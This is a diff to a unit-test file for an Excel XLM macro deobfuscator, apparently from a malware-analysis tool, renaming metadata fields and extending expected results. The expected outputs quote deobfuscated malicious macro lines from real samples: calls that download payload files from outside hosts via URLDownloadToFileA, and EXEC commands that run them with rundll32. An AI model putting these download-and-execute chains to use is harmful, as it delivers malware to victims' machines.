@@ -38,10 +38,10 @@ class TestXLMMacroDeobfuscator(TestUnitBase):
             '\'DoWnloAdsTrInG\'(\'ht\'+\'tp://paste.ee/r/pLpR9\')")',
         )
 
-    def test_every_step_is_labelled_with_its_address_status_and_indent(self):
+    def test_every_step_is_labelled_with_its_address_status_and_depth(self):
         self.assertEqual(
             [
-                (chunk.meta['addr'], chunk.meta['type'], chunk.meta['indent'])
+                (chunk.meta['cell'], chunk.meta['status'], chunk.meta['depth'])
                 for chunk in self.download_sample(XLM_MACRO_NAMES_BIFF8) | self.load()
             ],
             [('A9591', 'PartialEvaluation', 0)],
@@ -65,6 +65,11 @@ class TestXLMMacroDeobfuscator(TestUnitBase):
                 '"https://sgb.ac.ke/ds/3103.gif","..\\iekdhfe.dsk3",0,0)',
                 'CALL("URLMon","URLDownloadToFileA","JJCCBB",0,'
                 '"https://hashmati.com/ds/3103.gif","..\\iekdhfe.dsk4",0,0)',
+                '=EXEC("rundll32 ..\\iekdhfe.dsk,DllRegisterServer")',
+                '=EXEC("rundll32 ..\\iekdhfe.dsk1,DllRegisterServer")',
+                '=EXEC("rundll32 ..\\iekdhfe.dsk2,DllRegisterServer")',
+                '=EXEC("rundll32 ..\\iekdhfe.dsk3,DllRegisterServer")',
+                '=EXEC("rundll32 ..\\iekdhfe.dsk4,DllRegisterServer")=Doc1!BJ114()',
                 'HALT()',
             ],
         )
@@ -73,9 +78,9 @@ class TestXLMMacroDeobfuscator(TestUnitBase):
         unit = self.load()
         self.assertEqual(
             [
-                (chunk.meta['indent'], chunk.decode(unit.codec))
+                (chunk.meta['depth'], chunk.decode(unit.codec))
                 for chunk in _looping() | unit
-                if chunk.meta['indent']
+                if chunk.meta['cell'] == 'AZ110'
             ],
             [
                 (1, 'SET.VALUE(BD108,"ieclb.com.br/ds/3103.")'),
@@ -113,12 +118,12 @@ class TestXLMMacroDeobfuscator(TestUnitBase):
         data = date_cell(self.download_sample(XLM_MACRO_TEXT_XLSM), 'AZ113', '2026-10-01T00:00:00')
         data = replace_cell_formula(data, 'AZ110', 'CHAR(DAY(AZ113)*8)')
         unit = self.load(day=17)
-        steps = {chunk.meta['addr']: chunk for chunk in data | unit}
+        steps = {chunk.meta['cell']: chunk for chunk in data | unit}
         self.assertEqual(steps['AZ110'].decode(unit.codec), '\x88')
 
     def test_the_day_of_the_default_run_comes_from_the_search_of_the_date(self):
         data = date_cell(self.download_sample(XLM_MACRO_TEXT_XLSM), 'AZ113', '2026-10-01T00:00:00')
         data = replace_cell_formula(data, 'AZ110', 'CHAR(DAY(AZ113)*8)')
         unit = self.load()
-        steps = {chunk.meta['addr']: chunk for chunk in data | unit}
+        steps = {chunk.meta['cell']: chunk for chunk in data | unit}
         self.assertEqual(steps['AZ110'].decode(unit.codec), ' ')
